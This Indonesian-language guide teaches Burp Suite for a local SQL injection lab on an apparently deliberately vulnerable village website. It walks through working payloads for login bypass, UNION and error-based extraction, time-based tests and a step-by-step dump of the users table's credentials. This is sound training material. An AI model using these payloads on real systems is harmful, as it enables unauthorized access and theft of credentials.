# Panduan Burp Suite untuk SQL Injection Lab

## 1. Setup Burp Suite

### Install dan Konfigurasi
1. Download Burp Suite dari https://portswigger.net/burp
2. Buka Burp Suite → Proxy → Options
3. Pastikan listener aktif di `127.0.0.1:8080`

### Konfigurasi Browser
1. Buka Firefox/Chrome
2. Set proxy manual: `127.0.0.1:8080`
3. Install Burp CA Certificate untuk HTTPS

---

## 2. Workflow Pengujian

### Alur Dasar
```
Browser → Burp Proxy → Server
         ↓
    Intercept Request
         ↓
    Send to Repeater
         ↓
    Modify Parameter
         ↓
    Analyze Response
```

---

## 3. Intercept Request

### Cara Intercept
1. Buka tab **Proxy** → **Intercept**
2. Klik **Intercept is on** (hijau)
3. Buka target di browser (misal: `http://localhost/webdesa/cek_warga.php`)
4. Submit form dengan NIK sembarang
5. Request akan ter-intercept di Burp

### Contoh Intercepted Request
```
POST /webdesa/cek_warga.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

nik=3273010101000001
```

---

## 4. Repeater - Manual Testing

### Send to Repeater
1. Klik kanan pada intercepted request
2. Pilih **Send to Repeater** (Ctrl+R)
3. Buka tab **Repeater**

### Testing di Repeater
1. Ubah parameter `nik` menjadi:
   ```
   nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
   ```
2. Klik **Send**
3. Analisis response di panel kanan

### Apa yang Diperhatikan
- **Response Length** - Perubahan panjang response
- **Response Body** - Data yang muncul
- **Error Messages** - Pesan error MySQL
- **Status Code** - 200, 500, dll

---

## 5. Intruder - Automated Testing

### Setup Intruder
1. Send request ke Intruder (Ctrl+I)
2. Buka tab **Intruder** → **Positions**
3. Klik **Clear §** untuk clear default positions
4. Select parameter yang ingin di-test (misal: `nik`)
5. Klik **Add §** untuk mark sebagai payload position

### Contoh Marked Position
```
nik=§3273010101000001§
```

### Payload Types

#### Simple List
- Payload Type: Simple list
- Add payloads manual:
  ```
  ' OR '1'='1'-- -
  ' UNION SELECT 1,2,3-- -
  ' AND SLEEP(5)-- -
  ```

#### Numbers
- Payload Type: Numbers
- From: 1, To: 100, Step: 1
- Untuk testing ORDER BY

#### Null Payloads
- Payload Type: Null payloads
- Generate: 100
- Untuk time-based testing

### Start Attack
1. Klik **Start attack**
2. Perhatikan kolom:
   - **Status** - Response code
   - **Length** - Response length
   - **Response** - Response body

---

## 6. Decoder - Encoding/Decoding

### URL Decode
1. Copy encoded string
2. Buka tab **Decoder**
3. Paste → Auto-detect decode

### Manual Encode
1. Input string
2. Pilih encode type (URL, Base64, HTML, Hex)

### Contoh Penggunaan
```
Input:  ' OR 1=1-- -
URL:    %27%20OR%201%3D1--%20-
Hex:    27204f5220313d312d2d202d
```

---

## 7. Comparer - Response Comparison

### Bandingkan Response
1. Select dua response (true vs false condition)
2. Klik kanan → **Send to Comparer**
3. Buka tab **Comparer**
4. Pilih **Words** atau **Bytes** comparison

### Kegunaan
- Membedakan response untuk boolean-based blind injection
- Mendeteksi perbedaan kecil dalam response

---

## 8. Target - Scope dan Site Map

### Add to Scope
1. Buka tab **Target** → **Scope**
2. Klik **Add** → Input: `http://localhost/webdesa/`
3. Ini memfilter hanya target yang relevan

### Site Map
1. Browse website dengan proxy aktif
2. Buka tab **Target** → **Site map**
3. Semua request tercatat otomatis
4. Klik kanan → **Engagement tools** → **Discover content**

---

## 9. SQLi Testing Scenarios

### Scenario 1: Login Bypass
```
Target: admin/login.php
Method: POST
Parameter: username

Step 1: Intercept login request
Step 2: Send to Repeater
Step 3: Modify username:
        admin'-- -
Step 4: Send → Check if redirected to dashboard
```

### Scenario 2: Data Extraction
```
Target: cek_warga.php
Method: POST
Parameter: nik

Step 1: Test with ' ORDER BY 12-- -
Step 2: Confirm column count
Step 3: Test with ' UNION SELECT 1,2,3,...,12-- -
Step 4: Identify visible columns
Step 5: Extract database info
Step 6: Enumerate tables and columns
Step 7: Dump sensitive data
```

### Scenario 3: Error-Based Extraction
```
Target: berita_detail.php?id=
Method: GET

Step 1: Test with ?id=1'-- -
Step 2: Observe error message
Step 3: Use EXTRACTVALUE:
        ?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
Step 4: Data appears in error message
```

---

## 10. Tips dan Trik

### Response Analysis
- Gunakan **Grep - Match** untuk filter response
- Pattern: `error`, `warning`, `mysql`, `syntax`
- Ini membantu menemukan error disclosure

### Encoding Issues
- Jika special characters ter-encode, gunakan Decoder
- Pastikan Content-Type benar (`application/x-www-form-urlencoded`)

### Session Handling
- Login dulu sebelum test admin pages
- Cookie akan tersimpan di Burp
- Semua request berikutnya menggunakan session yang sama

### Save Results
- Klik kanan request → **Save item**
- Atau **Project** → **Save project**
- Untuk dokumentasi dan reporting

---

## 11. Contoh Lengkap - Extract Users Table

### Step 1: Find Column Count
```
Request:
POST /webdesa/cek_warga.php
nik=' ORDER BY 12-- -

Response: [data ditemukan - 12 kolom OK]

Request:
POST /webdesa/cek_warga.php
nik=' ORDER BY 13-- -

Response: [error - too many columns]
```

### Step 2: Find Visible Columns
```
Request:
POST /webdesa/cek_warga.php
nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -

Response: [perhatikan angka mana yang muncul di halaman]
```

### Step 3: Get Database Info
```
Request:
POST /webdesa/cek_warga.php
nik=' UNION SELECT 1,version(),3,4,database(),6,7,8,9,10,11,12-- -

Response: [versi MySQL dan nama database muncul]
```

### Step 4: List Tables
```
Request:
POST /webdesa/cek_warga.php
nik=' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema='webdesa'-- -

Response: [daftar tabel: users, warga, surat_pengajuan, berita]
```

### Step 5: List Columns in Users
```
Request:
POST /webdesa/cek_warga.php
nik=' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -

Response: [kolom: id,username,password,nama_lengkap,role,created_at]
```

### Step 6: Dump Credentials
```
Request:
POST /webdesa/cek_warga.php
nik=' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -

Response:
admin:admin123
petugas1:petugas123
```

---

## 12. Shortcut Keys

| Shortcut | Fungsi |
|----------|--------|
| Ctrl+R | Send to Repeater |
| Ctrl+I | Send to Intruder |
| Ctrl+Shift+R | Send to Comparer |
| Ctrl+U | URL encode selection |
| Ctrl+Shift+U | URL decode selection |
| Space | Forward intercepted request |

---

## 13. Troubleshooting

### Request Tidak Ter-Intercept
- Pastikan browser proxy benar (127.0.0.1:8080)
- Pastikan Intercept is ON (hijau)
- Clear browser cache

### Response Tidak Berubah
- Pastikan parameter benar-benar vulnerable
- Coba encoding berbeda
- Cek apakah ada WAF/filter

### Connection Error
- Pastikan XAMPP running (Apache + MySQL)
- Pastikan target URL benar
- Cek firewall settings
